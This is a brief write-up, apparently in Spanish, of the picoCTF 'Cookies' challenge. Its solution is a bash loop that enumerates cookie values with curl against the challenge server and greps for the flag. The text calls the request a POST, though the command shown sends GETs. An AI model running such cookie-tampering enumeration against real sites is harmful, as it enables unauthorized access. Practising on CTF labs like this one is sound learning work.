## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)

## Pistas

## Solución

Enviando una solicitud POST en la terminal
```bash
for i in {1..30}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep 'picoCTF'

```

## Notas adicionales

## Referencias